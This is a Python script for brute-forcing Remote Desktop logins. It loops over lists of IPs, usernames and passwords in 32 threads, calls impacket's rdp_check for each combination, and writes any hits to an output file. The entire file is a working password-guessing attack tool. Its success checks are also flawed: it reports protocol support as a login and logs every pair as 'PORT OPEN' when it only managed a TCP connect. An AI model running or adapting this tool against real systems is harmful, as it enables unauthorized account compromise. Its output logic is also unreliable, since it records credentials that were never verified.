import os
import subprocess
import threading
import queue
import time

def load_lines(path):
    if os.path.exists(path):
        with open(path) as f:
            return [line.strip() for line in f if line.strip()]
    return []

def brute_worker(ip, user, password, timeout, result_q):
    # Try impacket rdp_check.py if available
    try:
        cmd = [
            'python3', '-m', 'impacket.examples.rdp_check',
            f'{user}:{password}@{ip}',
            '-timeout', str(timeout)
        ]
        proc = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, timeout=timeout+2)
        out = proc.stdout.decode(errors='ignore') + proc.stderr.decode(errors='ignore')
        if 'RDP protocol supported' in out or 'RDP authentication succeeded' in out or 'Authentication OK' in out:
            result_q.put((ip, user, password, 'OK'))
            return
        if 'Authentication failed' in out or 'ERROR' in out:
            return
    except Exception:
        pass
    # Fallback: just check TCP connect (no auth)
    import socket
    try:
        with socket.create_connection((ip, 3389), timeout=timeout):
            pass
    except Exception:
        return
    # No real auth fallback, so only report if port open
    result_q.put((ip, user, password, 'PORT OPEN'))

def brute_force(ips, users, passwords, timeout=8, threads=32):
    result_q = queue.Queue()
    jobs = []
    for ip in ips:
        for user in users:
            for pwd in passwords:
                jobs.append((ip, user, pwd))
    total = len(jobs)
    found = 0
    def worker():
        while True:
            try:
                ip, user, pwd = job_q.get_nowait()
            except queue.Empty:
                return
            brute_worker(ip, user, pwd, timeout, result_q)
            job_q.task_done()
    job_q = queue.Queue()
    for job in jobs:
        job_q.put(job)
    threads_list = []
    for _ in range(threads):
        t = threading.Thread(target=worker)
        t.daemon = True
        t.start()
        threads_list.append(t)
    job_q.join()
    results = []
    while not result_q.empty():
        results.append(result_q.get())
    os.makedirs('output', exist_ok=True)
    with open('output/rdp_results.txt', 'a') as f:
        for ip, user, pwd, status in results:
            f.write(f"{ip}:{user}:{pwd}:{status}\n")
    return results 